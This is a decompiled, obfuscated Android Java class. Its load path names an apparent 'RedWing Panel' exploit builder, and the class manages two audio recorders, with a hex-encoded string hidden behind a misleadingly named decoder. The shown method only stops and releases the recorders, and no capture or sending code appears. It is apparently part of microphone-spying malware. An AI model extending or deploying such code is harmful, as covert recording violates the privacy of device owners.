package v.s;

import android.content.Context;
import android.media.AudioRecord;
import app.mobilex.plus.util.TypefaceCache;
import java.util.concurrent.LinkedBlockingQueue;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class PHZNFNJs3M6qql {
    public static volatile boolean D5P1xCAyuvgF;
    public static volatile PHZNFNJs3M6qql pyu8ovAipBTLYAiKab;
    public Thread Ee8d2j4S9Vm5yGuR;
    public Thread JXn4Qf7zpnLjP5;
    public volatile boolean b1EoSIRjJHO5;
    public final Context dDIMxZXP1V8HdM;
    public final LinkedBlockingQueue ibVTtJUNfrGYbW = new LinkedBlockingQueue(50);
    public AudioRecord vekpFI4d1Nc4fakF;
    public AudioRecord w9sT1Swbhx3hs;
    public volatile boolean xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("000E007F005800B400E400AD00D700A6002E");
    }

    public PHZNFNJs3M6qql(Context context) {
        this.dDIMxZXP1V8HdM = context;
    }

    private static /* synthetic */ void nxmkqwq() {
    }

    public final synchronized void dDIMxZXP1V8HdM() {
        if (this.b1EoSIRjJHO5) {
            return;
        }
        this.b1EoSIRjJHO5 = true;
        try {
            AudioRecord audioRecord = this.w9sT1Swbhx3hs;
            if (audioRecord != null) {
                audioRecord.stop();
            }
        } catch (Exception unused) {
        }
        try {
            AudioRecord audioRecord2 = this.w9sT1Swbhx3hs;
            if (audioRecord2 != null) {
                audioRecord2.release();
            }
        } catch (Exception unused2) {
        }
        try {
            AudioRecord audioRecord3 = this.vekpFI4d1Nc4fakF;
            if (audioRecord3 != null) {
                audioRecord3.stop();
            }
        } catch (Exception unused3) {
        }
        try {
            AudioRecord audioRecord4 = this.vekpFI4d1Nc4fakF;
            if (audioRecord4 != null) {
                audioRecord4.release();
            }
        } catch (Exception unused4) {
        }
        this.w9sT1Swbhx3hs = null;
        this.vekpFI4d1Nc4fakF = null;
        D5P1xCAyuvgF = false;
        this.ibVTtJUNfrGYbW.clear();
    }
}
